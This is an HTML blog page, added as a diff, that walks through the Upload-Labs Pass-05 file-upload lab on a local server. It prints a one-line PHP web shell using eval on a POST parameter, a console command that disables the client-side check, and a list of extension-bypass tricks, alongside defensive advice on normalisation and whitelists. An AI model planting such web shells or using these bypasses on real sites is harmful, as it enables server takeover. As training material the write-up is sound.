@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Writeup: Upload-Labs Pass-05 - Y11516</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0e17; background-image: radial-gradient(circle at 50% 20%, rgba(0, 240, 255, 0.05) 0%, transparent 50%); font-family: 'Inter', sans-serif; color: #ccd6f6; padding: 6rem 1rem 4rem 1rem; display: flex; justify-content: center; line-height: 1.8; }
+        .navbar { position: fixed; top: 0; left: 0; width: 100%; padding: 1.2rem 5%; display: flex; justify-content: space-between; align-items: center; background: rgba(10, 14, 23, 0.7); backdrop-filter: blur(12px); border-bottom: 1px solid rgba(0, 240, 255, 0.15); z-index: 999; }
+        .logo { font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 1.2rem; color: #00f0ff; letter-spacing: 2px; }
+        .nav-links a { color: #8892b0; text-decoration: none; margin-left: 2rem; font-size: 0.9rem; transition: 0.3s; }
+        .nav-links a:hover { color: #00f0ff; }
+        .post-container { max-width: 820px; width: 100%; background: rgba(255,255,255,0.03); backdrop-filter: blur(6px); border: 1px solid rgba(255,255,255,0.06); border-radius: 32px; padding: 3rem; box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6); }
+        h1 { font-family: 'Orbitron', sans-serif; font-size: 2.2rem; margin-bottom: 0.5rem; color: #00f0ff; text-shadow: 0 0 15px rgba(0, 240, 255, 0.3); }
+        .date { color: #475569; font-size: 0.9rem; margin-bottom: 2rem; padding-bottom: 1rem; border-bottom: 1px solid rgba(0, 240, 255, 0.2); display: flex; gap: 15px; flex-wrap: wrap;}
+        .date span { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.8rem; border-radius: 12px; color: #00f0ff; font-size: 0.8rem; }
+        h2 { color: #a855f7; font-size: 1.4rem; margin: 2.5rem 0 1rem 0; border-left: 4px solid #a855f7; padding-left: 10px; }
+        h3 { color: #e2e8f0; font-size: 1.15rem; margin: 1.8rem 0 0.8rem 0; }
+        h4 { color: #c084fc; font-size: 1rem; margin: 1.2rem 0 0.6rem 0; }
+        p { margin-bottom: 1rem; color: #94a3b8; }
+        strong { color: #e2e8f0; }
+        code { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.4rem; border-radius: 4px; font-family: 'Courier New', monospace; color: #00f0ff; font-size: 0.95rem; }
+        pre { background: #0f172a; padding: 1rem; border-radius: 8px; overflow-x: auto; border: 1px solid #1e293b; margin-bottom: 1rem; }
+        pre code { background: transparent; padding: 0; color: #e2e8f0; }
+        ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; color: #94a3b8; }
+        li { margin-bottom: 0.5rem; }
+        .highlight-box { background: rgba(168, 85, 247, 0.05); border: 1px solid rgba(168, 85, 247, 0.2); border-radius: 12px; padding: 1.5rem; margin-bottom: 1rem; }
+        .note-box { background: rgba(0, 240, 255, 0.05); border-left: 3px solid #00f0ff; padding: 1rem; margin-bottom: 1rem; border-radius: 0 8px 8px 0; }
+        .action-bar { display: flex; justify-content: center; gap: 1.5rem; margin-top: 3rem; flex-wrap: wrap; }
+        .action-link { color: #00f0ff; text-decoration: none; border: 1px solid #00f0ff; padding: 10px 24px; border-radius: 30px; transition: 0.3s; }
+        .action-link:hover { background: rgba(0, 240, 255, 0.1); }
+        .action-link.secondary { color: #8892b0; border-color: #475569; }
+        @media (max-width: 640px) { .post-container { padding: 1.5rem; } h1 { font-size: 1.5rem; } .action-bar { flex-direction: column; } }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="logo"><i class="fas fa-shield-halved"></i> Y11516</div>
+        <div class="nav-links">
+            <a href="/ctf.html"><i class="fas fa-bug"></i> CTF 总库</a>
+            <a href="/"><i class="fas fa-house"></i> 主页</a>
+        </div>
+    </nav>
+
+    <div class="post-container">
+        <h1><i class="fas fa-upload"></i> Upload-Labs Pass-05</h1>
+        <div class="date">
+            <span><i class="far fa-calendar-alt"></i> 2026年9月26日</span>
+            <span><i class="fas fa-tag"></i> Upload-Labs</span>
+            <span><i class="fas fa-tag"></i> Web安全</span>
+            <span><i class="fas fa-tag"></i> 文件上传</span>
+            <span><i class="fas fa-tag"></i> 大小写绕过</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>Upload-Labs Pass-05 (后缀大小写绕过)</li>
+            <li><strong>题目平台：</strong>Upload-Labs 本地靶场</li>
+            <li><strong>题目类型：</strong>Web安全 / 文件上传漏洞 / 代码审计 / 大小写绕过</li>
+            <li><strong>靶场链接：</strong>http://localhost:8082/Pass-05/index.php（本地环境）</li>
+            <li><strong>涉及工具：</strong>Chrome浏览器 (F12开发者工具)、Network面板</li>
+        </ul>
+
+        <h2>二、解题步骤</h2>
+        
+        <h3>1. 分析题目考什么</h3>
+        <p>本题的核心考点是<strong>后缀大小写绕过</strong>。通过对比 Pass-04 和 Pass-05 的源码可以发现，Pass-05 删除了 <code>strtolower()</code> 函数，导致黑名单匹配是<strong>严格区分大小写</strong>的。攻击者只需上传后缀为 <code>.PHP</code> 或 <code>.Php</code> 的文件，即可绕过黑名单。</p>
+
+        <h3>2. 怎么想（破题思路）</h3>
+        <ul>
+            <li>在 Pass-05 页面直接上传 <code>shell.Php</code>，前端 JS 弹窗拦截。</li>
+            <li>在 F12 Console 中执行 <code>checkFile = function() { return true; }</code> 覆盖前端校验。</li>
+            <li>重新上传 <code>shell.Php</code>，后端黑名单只匹配小写 <code>.php</code>，遇到大写直接放行。</li>
+            <li>在 Network 面板中找到被靶场重命名后的真实路径，访问并验证。</li>
+        </ul>
+
+        <h3>3. 怎么解（详细步骤与踩坑记录）</h3>
+        
+        <div class="note-box">
+            <h4><i class="fas fa-exclamation-triangle"></i> 踩坑记录一：前端 JS 残留拦截</h4>
+            <p><strong>踩坑情况：</strong>上传 <code>shell.Php</code> 时，页面弹窗提示禁止上传。</p>
+            <p><strong>原因分析：</strong>虽然 Pass-05 后端代码删除了 <code>strtolower()</code>，但前端 JS 校验依然存在，且对大小写混合的文件名也进行了拦截。</p>
+            <p><strong>改进方式：</strong>按 F12，在 Console 中执行 <code>checkFile = function() { return true; }</code>，禁用前端拦截。</p>
+        </div>
+
+        <div class="note-box">
+            <h4><i class="fas fa-exclamation-triangle"></i> 踩坑记录二：文件上传成功后访问提示 404</h4>
+            <p><strong>踩坑情况：</strong>上传了 <code>pass05_shell.Php</code>，但访问该文件时提示 404 Not Found。</p>
+            <p><strong>原因分析：</strong>靶场源码第14行明确写着 <code>$img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;</code>，这意味着**后端会将你上传的文件重命名成一串带时间戳和随机数的数字**，你原来的文件名被丢弃了。</p>
+            <p><strong>改进方式：</strong>在 F12 的 Network 面板中，找到上传请求，在响应头或返回的 HTML 中找到真实的数字文件名（如 <code>202609261206186590.Php</code>），访问这个真实路径进行验证。</p>
+        </div>
+
+        <div class="note-box">
+            <h4><i class="fas fa-exclamation-triangle"></i> 踩坑记录三：环境差异（php -S 不支持大写后缀）</h4>
+            <p><strong>踩坑情况：</strong>访问真实的 <code>202609261206186590.Php</code> 文件时，页面没有执行 PHP 代码，而是直接输出了 PHP 源码（<code>&lt;?php ... ?&gt;</code>）。</p>
+            <p><strong>原因分析：</strong>本次靶场使用的是 <code>php -S localhost:8082</code> 启动的 PHP 内置服务器。内置服务器非常死板，默认只将全小写 <code>.php</code> 结尾的文件交给 PHP 解析器。因为后缀是大写 <code>.Php</code>，内置服务器把它当成静态文本直接返回。</p>
+            <p><strong>改进方式：</strong>这不影响本次通关（文件已成功上传并绕过黑名单）。如果要在本地完全模拟真实环境，建议使用 MAMP、phpStudy 等 Apache 集成环境，即可正常解析执行。</p>
+        </div>
+
+        <div class="highlight-box">
+            <h4><i class="fas fa-terminal"></i> 详细实操步骤（Payload逐字解释）</h4>
+            
+            <p><strong>第一步：禁用前端 JS</strong></p>
+            <p>按 <code>F12</code> 打开 Console，输入并回车：</p>
+            <pre><code>checkFile = function() { return true; }</code></pre>
+
+            <p><strong>第二步：准备 WebShell 并改后缀</strong></p>
+            <p>在本地新建 <code>shell.php</code>，内容为：</p>
+            <pre><code>&lt;?php echo "PASS-05-SUCCESS"; @eval($_POST['cmd']); ?&gt;</code></pre>
+            <p>将其复制一份并重命名为 <code>pass05_shell.Php</code>（首字母大写）。</p>
+
+            <p><strong>第三步：上传并获取真实路径</strong></p>
+            <p>选中 <code>pass05_shell.Php</code> 上传，页面提示“上传成功”。</p>
+            <p>在 F12 的 Network 面板中，找到对应的 POST 请求，观察返回的 HTML 中是否有类似 <code>../upload/202609261206186590.Php</code> 这样的路径。</p>
+
+            <p><strong>第四步：验证</strong></p>
+            <p>访问该真实路径。如果显示源码或空白，说明文件已经成功上传到了服务器上，本次注入（绕过黑名单）成功。</p>
+        </div>
+
+        <h3>4. 怎么迁移（跨领域联想）</h3>
+        <ul>
+            <li><strong>编程语言的大小写规范：</strong>在 PHP、Python 等语言中，变量名和函数名是区分大小写的，而 HTML、SQL 的某些部分则不区分。这种差异常常成为开发漏洞的温床。开发者必须清晰地了解所使用语言的特性。</li>
+            <li><strong>输入验证的规范化：</strong>在安全防御中，对任何用户输入（如文件后缀）进行过滤前，必须先执行“规范化”处理（如统一转为小写、去除空格、URL 解码等）。否则，攻击者就能利用大小写、空格、特殊字符等变体绕过。</li>
+            <li><strong>环境差异与漏洞触发：</strong>同一个漏洞在不同环境下的触发条件不同。Pass-05 在某些 Apache 环境下靠大小写就能执行，而在 `php -S` 环境下则只能绕过黑名单而无法执行代码。这提醒我们，渗透测试一定要结合实际环境（Context）来判断。</li>
+        </ul>
+
+        <h2>三、名词大全与原理深度复盘</h2>
+        
+        <div class="highlight-box">
+            <h4>1. strtolower() 函数</h4>
+            <p>PHP 中用于将字符串转换为小写的函数。在文件上传安全中，它常被用于统一后缀格式，防止攻击者通过大小写混合（如 <code>.pHp</code>）绕过黑名单。Pass-05 删除了此函数，导致黑名单校验失效。</p>
+
+            <h4>2. in_array() 函数</h4>
+            <p>PHP 中用于检查数组中是否存在某个值的函数。默认情况下，<code>in_array()</code> 的匹配是区分大小写的。例如 <code>in_array('.PHP', array('.php'))</code> 会返回 <code>false</code>。</p>
+
+            <h4>3. Linux 文件系统的大小写敏感</h4>
+            <p>在 Linux 环境下，<code>shell.Php</code> 和 <code>shell.php</code> 是两个完全不同的文件。而在 Windows 环境下，它们被视为同一个文件。利用 Linux 的大小写敏感特性，攻击者可以绕过只匹配小写的黑名单。</p>
+
+            <h4>4. 代码审计思维</h4>
+            <p>通过对比 Pass-04 和 Pass-05 的源码，直观地发现了 <code>strtolower()</code> 的缺失。这种通过阅读源码来寻找安全逻辑漏洞的方法，就是代码审计。它是渗透测试中最高效、最根本的漏洞挖掘方式之一。</p>
+        </div>
+
+        <h2>四、题目思考</h2>
+        
+        <h3>1. 这跟前面的题有什么区别？</h3>
+        <ul>
+            <li><strong>与 Pass-04 的区别：</strong>Pass-04 有 <code>strtolower()</code>，大小写绕过无效，必须使用 <code>.htaccess</code>。Pass-05 删除了该函数，大小写绕过重新生效。</li>
+            <li><strong>与前两关的共同点：</strong>依然需要先绕过前端 JS（F12 覆盖函数），再处理后端逻辑。</li>
+        </ul>
+
+        <h3>2. 这种题目的出现原因（为什么存在）</h3>
+        <p>许多开发者在处理黑名单时，思维还停留在“列出所有危险后缀”。但他们忽略了攻击者可以通过大小写、空格、点号、特殊字符等多种方式对输入进行“变形”。这本质上是防御思维不够完善，没有意识到对输入进行“规范化”处理是安全防御的第一步。</p>
+
+        <h3>3. 这种应用在实际中如何体现？</h3>
+        <p>在真实的渗透测试中，面对严格的黑名单，攻击者通常会先尝试各种变形。大小写绕过是其中最基础的一种。如果后端屏蔽了大小写，还会尝试使用双写（如 <code>.pphphp</code>）、空格（<code>.php </code>）、点号（<code>.php.</code>）、以及 Windows 的文件流特性（<code>.php::$DATA</code>）。防御者则应果断采用“白名单”机制。</p>
+
+        <h3>4. 如何抽象理解概念（大白话）</h3>
+        <div class="highlight-box">
+            <p><strong>把靶场比作一个“严格的门卫”：</strong></p>
+            <ul>
+                <li>Pass-05 的门卫手里有一份黑名单，写着“禁止携带‘刀’（.php）进入”。</li>
+                <li>门卫非常死板，只认小写。你拿着写着“刀（.PHP）”的包裹走过去，门卫一看，大写字母，不认识，直接放你进去了。</li>
+                <li>如果门卫在检查前规定：“所有包裹名称都必须先统一翻译成小写再看”，那你就无法蒙混过关了。这就是 <code>strtolower()</code> 存在的意义。</li>
+            </ul>
+        </div>
+
+        <p style="margin-top: 2rem; text-align: center; color: #475569;"><i class="fas fa-code"></i> 做一道题，就要往自己脑子里装点东西。</p>
+
+        <div class="action-bar">
+            <a href="/ctf.html" class="action-link"><i class="fas fa-arrow-left"></i> 返回 CTF 总库</a>
+            <a href="/" class="action-link secondary"><i class="fas fa-house"></i> 返回主页</a>
+        </div>
+    </div>
+</body>
+</html>
